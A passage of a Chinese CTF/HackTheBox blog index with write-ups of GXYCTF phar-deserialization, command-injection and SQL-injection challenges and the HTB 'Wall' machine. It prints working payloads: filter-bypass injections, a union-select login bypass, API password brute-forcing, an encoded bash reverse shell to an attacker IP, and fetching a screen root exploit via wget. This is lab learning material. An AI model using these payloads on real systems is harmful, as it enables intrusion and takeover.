class="string">'user'</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>只要保证token是与user的session相同即可eval执行命令。<br>那么同时我们实例化的对象$uploader在_toString方法中看到，返回值是filename,也是我们可控的name的值。那我们只要让最后的file_get_contents()执行时读我们可控的flag.php就好了。既然如此，先随便传一个文件确定下提示我们的文件位置，确认token,然后本地生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o=<span class="keyword">new</span> Uploader();</span><br><span class="line">$o-&gt;cmd=<span class="string">'highlight_file("/var/www/html/flag.php)'</span>;</span><br><span class="line">$o-&gt;Filename=<span class="string">'test'</span>;</span><br><span class="line">$o-&gt;token=<span class="string">'GXYbef648df4f254d89810fd44f9a2fc822'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传phar后，name参数赋值<br><code>phar://+上传phar文件的地址</code><br>再随便上传文件就可以触发phar反序列化，达到命令执行。</p><p>其实因为出题人多打了一个空格，导致正则匹配没效果……直接传一句话或者直接包含flag.php后传文件都可以拿flag……</p><p>GXY的题就先告一段落吧，明天还要做做代码审计的题目，之后要把基础漏洞相关知识都了解透彻，毕竟自己底子不牢。然后把欠着的ssrf,phar等等都系统学一学应该就好了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF--PingPingPing&amp;BabySqli</title>
      <link href="2020/01/13/GXYCTF-PingPingPing-BabySqli/"/>
      <url>2020/01/13/GXYCTF-PingPingPing-BabySqli/</url>
      
        <content type="html"><![CDATA[<p>  说来惭愧，之前12月份初报了GWYCTF,结果到了比赛的时候又因为复习忙的焦头烂额，所以一道题目都没看。刚好因为题目难度是针对校内招新的，我就现在复现下吧：<br>题目复现地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a><br>大佬们在各种比赛群里应该已经知道了这个平台的存在了，有一说一那位师傅是真的富……<br>还是要感谢buuoj.cn提供了一个复现这些年大赛题目的机会。</p><a id="more"></a><h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>开始进入提示传参ip,原题应该是直接给了一个输入框，输入后发现有执行ping命令的效果<br>那么看来是命令执行的题目了，命令执行的方法大抵是加上管道符或者分号，那么试试管道符<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/1.jpg" alt="ls"><br>尝试读flag发现果然被ban了，那么试试index.php发现提示空格被ban了。<br>绕过空格的方法大概有以下几种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>不妨就用 <code>$IFS</code>试试，无果，用<code>${IFS}</code>发现{}被ban。再试<code>$IFS$1</code>成功。<br>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match);</span></span><br><span class="line"><span class="string">    die("fxck your symbol!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/ /", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your space!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/bash/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your bash!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your flag!");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec("ping -c 4 ".$ip);</span></span><br><span class="line"><span class="string">  echo "</span></span><br><span class="line"><span class="string">";</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了许多标点，空格，bash,包括flag的贪婪匹配。那么自己印象中几种做法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.cat fl*       利用*匹配任意 不行</span><br><span class="line">2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash   也不行</span><br><span class="line">3.ca\t fl\ag.php   不行</span><br><span class="line">4.cat fl&#39;&#39;ag.php 不行</span><br></pre></td></tr></table></figure><p>那么如何解决呢？其实还有一种比较常见的做法没有提及，那就是变量拼接：<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/2.jpg" alt="变量拼接"><br>之前自己特别喜欢用的一句话木马拆开用也是这个道理。</p><p>正好，我们看到源码中有一个$a变量可以覆盖，那么payload就出来了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>然后有官方与其他大佬的高端解法：<br>官方：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。</p><p>dalao<br>内联执行的做法，只能说V&amp;N的师傅们太强了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>内联，就是将反引号内命令的输出作为输入执行。<br>秒题大概就是这种做法吧……</p><h1 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h1><p>进去后一个账号，密码输入框。先随便输下，提示wrong pass。但是看源码有意外收获<img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/3.jpg" alt="FUZZ"><br>从形式上看数字成分都没有超过6,可能是base32，解码后得到一个base64编码，解码后得到以下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>那么就可以在username这个注入点下手处理了。这道题目只过滤了基本的and与等号还是很能操作的。不过后来看别人说这题考点在MD5查询绕过。这么说的原因是，就算成功注入把admin密码的MD5拿到，因为解不了的缘故等于没用。基于题目提示的wrong pass，那么大概率是直接拿输入密码的MD5数值跟数据库里已知值比较。</p><p>稍微FUZZ一下<code>admin&#39; union select 1,2,3</code>可以确认有三个字段<br>后面确认大概是id,admin，passwd三个字段。这里为了绕过，需要保证我们的查询结构一致，就可直接select 想要的返回值。<br>那么构造一个为假的查询-1，后面接上联合查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1,&#39;admin&#39;,&#39;7363a0d0604902af7b70b271a0b96480&#39;#</span><br></pre></td></tr></table></figure><p>密码输123即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Wall</title>
      <link href="2020/01/12/hackthebox-Wall/"/>
      <url>2020/01/12/hackthebox-Wall/</url>
      
        <content type="html"><![CDATA[<p> 总算是挺过了期末12门的魔鬼考试日程，迎来了寒假……这次寒假打算学的还挺多的，也希望自己能坚持学习，把知识尽量融会贯通吧。之前曾说过希望能早日拿下自己在hackthebox上的第一台靶机，没想到这么快就在帮助下拿到手了。其实在进入期末复习阶段中的一段时间，自己就参考youtube上一位优秀的hacker youtuber关于hackthebox的视频成功拿到了靶机，只不过一直没写文章。而现在这台Wall靶机在hackthebox上也已经处于下架状态，所以我就简单记录一下拿下Wall的过程，没法贴实操图了。</p><a id="more"></a><p>参考的youtuber:IppSec  <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" target="_blank" rel="noopener">https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA</a><br>幸好自己英语水平过硬，可以啃他的生肉视频。感谢这位大佬，确实帮到了我很多。</p><p><img src="/2020/01/12/hackthebox-Wall/1.jpg" alt="Wall"><br><strong>本机ip:10.10.14.3</strong><br>(也许吧,记不得了hhh)<br><strong>靶机ip:10.10.10.157</strong></p><p>然后回顾一下整个过程吧。首先第一步当然是使用hackthebox提供给我们的ovpn连接。这样我们就创建好了与靶机之间的虚拟专有网络。可以访问到题目。</p><p>之后就是面对hackthebox上一众靶机的常规套路：使用nmap进行端口扫描（这应该也是正常渗透过程中的第一步）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sC -sV -oA namp&#x2F;wall 10.10.10.157</span><br></pre></td></tr></table></figure><p>我学习了下那位youtuber的好习惯，这里namp不仅做了扫描，同时还保存为文件方便回顾。</p><p>之后发现开放了两个端口，80与22,也就是http与ssh对应服务。尝试直接访问，也得到了apache的默认页面。基于ssh并无太多利用之处，可以直接从web页面下手。<br>那么先扫下目录，来看看有没有什么可能有趣的,在简单的FUZZ一下robots.txt,.htacess都无结果后，果断使用gobuster：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.157&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>扫到了一个/monitoring，尝试访问，却发现提示unauthorized。并提示输入用户密码，尝试下admin-admin,admin-password,guest-guest等等可能的弱口令无果，于是得另辟蹊径。<br>顺便补一下webAPI中authorize跟authentication的区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">身份验证（Authentication）：确定用户是谁。</span><br><span class="line"></span><br><span class="line">授权(Authorization)：确定用户能做什么，不能做什么。</span><br></pre></td></tr></table></figure><p>这里从dalao那学到了一招：抓包后，当以GET方式访问/monitoring时，我们得到的是401 unauthorized,但如果以POST方式访问，就会的到页面提示，并拿到后续操作的页面目录  /centreon</p><p>再度访问，终于得到一个centreon的登录界面，同时版本为19.04.0那么问题就回到用户密码上了。<br>为了能了解这一系统，当然需要谷歌了解下centreon到底为何物，以及有什么可以利用的。很快就可以发现，这一版本存在有sql注入，RCE命令执行等等漏洞；或者使用kali上的searchspolit</p><figure class="highlight plain"><figcaption><span>centreon```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现有RCE等等漏洞以及利用，我们对RCEgetshell相对比较轻松，那么就不妨看看RCE的利用</span><br><span class="line">&#96;&#96;&#96; searchsploit  -x &quot;此处接利用的脚本文件地址&quot;</span><br></pre></td></tr></table></figure><p>仔细审过后发现，从上面提到的种种漏洞到现在具体的RCE，我们都需要在autheticated的前提下利用，那么还是得从登陆界面的用户密码下手。</p><p>这里又从大佬那学到了第二招：在登录界面随便输入尝试登录并抓包时，会发现burp抓包得内容除了admin,password参数，还会有centreon自带的token。这就给我们的暴力破解可能性画上了句号。那么还有其他方法爆破吗？有的，通过API来尝试： google后发现确实存在centreon的api,而且确实只传了username,password两个参数，是可以爆破的。<br>之后继续FUZZ，于是准备post访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate</span><br></pre></td></tr></table></figure><p>并顺便传参admin=admin&amp;password=passowrd。发现返回bad crendentials。并且改掉username参数时返回的是一致的，这样就不好通过response来爆破。那只能猜测用户名是admin了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz  http:&#x2F;&#x2F;10.10.10.157&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate -w &#x2F;usr&#x2F;share&#x2F;seclist&#x2F;Passwords&#x2F;darkweb2017-top1000.txt  -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; --hc 403</span><br></pre></td></tr></table></figure><p>–hc 可以筛掉返回403的结果。<br>上面用的这个字典我好像kali上并没有，只能自己找字典用了。<br>很快得到正确的密码 password1……这个弱口令真的是强，简单归简单，总归人手FUZZ应该不太能FUZZ出来……</p><p>之后就成功登陆，轮到我们大展身手了。在网上可以查到很多种利用，我参考了dalao的那种命令执行（像这种控制台里的确存在很多可以注入利用的地方）在centreon的configuration中可以进行命令执行,简单试下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 127.0.0.1;</span><br></pre></td></tr></table></figure><p>linux的ping貌似与windows有区别。<br>然而在命令执行时失败了并返回403。继续尝试其他的发现可能是过滤了空格。于是使用常见的一种绕过手段：<code>${IFS}</code>绕过空格。<br>另外，我还学到了有别于自己原来垃圾的把空格一个个换成${IFS}的手段。直接在linux命令行中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;ping -c 1 127.0.0.1;&#39;|sed  &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure><p>就得到了payload ,再度放在刚刚的命令执行空格中，保存，并export configuration以执行命令。发现成功了。<br>既然测试好了，那我们就直接getshell吧。<br>原payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure><p>这里bash -c 是直接将后面的字符串内容执行命令。而后面bash -i等等就是bash反弹shell的命令了。(这里自己其实自学了好久，也折腾了不晒时间才成功在kali上拿到自己的一台公网vps的shell，之后如果写学习笔记再详细解释理解下)<br>这里不妨用base64编码下绕检查,我也不记得这里不用base64编码是否会产生被过滤bash的问题，但毕竟bash是高危命令，还是执行编码为妙。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; &quot;|base 64</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;</span><br></pre></td></tr></table></figure><p>那么绕过空格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; | base4 -d | bash&quot; |sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure><p>现payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;$&#123;IFS&#125;|$&#123;IFS&#125;base4$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;bash;</span><br></pre></td></tr></table></figure><p>记得最后要有分号。之后在自己kali上监听8888端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure><p>命令执行即可getshell。</p><h2 id="拿-user-权限"><a href="#拿-user-权限" class="headerlink" title="拿 user 权限"></a>拿 user 权限</h2><p>hackthebox的靶机拿下，并不只是简单的getshell,而是要分别拿到root权限与user权限下的两个文件中的flag提交才算成功。这里自己因为没什么提权经验，很大程度上参考了不少wp与视频才算成功。<br>先从简单的user开始：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p>发现user有shelby与sysmonitor两个。找一下shelby的内容后发现只有shelby有权限读user.txt即flag。<br>经过一番挖掘，可以发现能够找到/opt/.shelby/backup这一文件。<code>file backup</code>后发现是一个python编译文件，可能就是pyc吧。执行下<code>python backup</code><br>这时我们如果再ls -la，就会发现我们不知怎么已经完成了authentication。<br>进入目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 backup</span><br></pre></td></tr></table></figure><p>将结果在本机的vim保存为backup.pyc.b64，再base64解码，这样这样一个pyc文件就算到了本机了。然后我们用python 的uncompyle库反编译一下。还原了py文件。<br>从其中直接拿到shelby 的密码 ShelbyPassw@rdIsStrong!<br>ssh登录shelby即可读user.txt。</p><h2 id="拿-root-权限"><a href="#拿-root-权限" class="headerlink" title="拿 root 权限"></a>拿 root 权限</h2><p>拿root权限时我就比较尴尬了，因为这里root的payload可以直接拿到root跟shelby二者的权限。<br>参考了一个解法：</p><blockquote><p>/bin/screen-4.5.0<br>For this exact version there is a vulnerability that allows to escalate to root</p></blockquote><p>这里/bin下的screen版本允许我们直接利用漏洞拿到root权限。payload在此：<a href="https://github.com/XiphosResearch/exploits/tree/master/screen2root" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/tree/master/screen2root</a><br>那接下来只用把脚本放到我们拿到shell的机子执行screenroot.sh即可。那么如何传输文件呢？这里运用到了python强大的功能，也是自己之前曾用过的SimpleHTTPServer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpliHTTPServer</span><br></pre></td></tr></table></figure><p>这样就默认监听8000端口了，先把脚本放在根目录。尝试<code>curl 10.10.14.3:8000/screenroot.sh</code>失败,没有安装curl。再尝试<code>wget 10.10.14.3:8000/screenroot.sh</code>成功，在靶机shell拿到脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash screenroot.sh</span><br></pre></td></tr></table></figure><p>运行成功，进入shell的交互页面。cat /root/root.txt即可，还可以cat /home/shelby/user.txt拿到之前的userflag。</p><p>大抵如此吧。当时即使在参考，自己也花了不少时间在getshell后的提权上，看来自己还要再多加了解学习呀。寒假已经开始，我也争取再拼一把，多学一些web方面的知识吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
